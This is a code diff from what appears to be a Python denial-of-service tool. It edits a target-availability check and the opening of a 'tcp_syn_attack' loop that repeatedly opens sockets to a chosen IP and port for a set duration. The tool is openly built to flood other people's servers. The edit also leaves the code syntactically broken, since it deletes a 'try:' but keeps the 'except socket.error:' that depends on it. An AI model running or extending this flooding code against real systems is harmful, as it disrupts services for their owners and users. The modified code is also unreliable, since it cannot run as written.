@@ -49,10 +49,9 @@ def parse_arguments():
 
 def check_target_availability(target_ip, target_port): 
     # Memeriksa ketersediaan target sebelum memulai serangan.
-    try:
-        socket.create_connection((target_ip, target_port), timeout=5)
-        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
-        return True
+    socket.create_connection((target_ip, target_port), timeout=5)
+    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
+    return True
     except socket.error:
         print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
         return False
@@ -76,7 +75,6 @@ def tcp_syn_attack(target_ip, target_port, duration):
     packets_sent = 0
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
-except: 
     while time.time() < end_time:
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
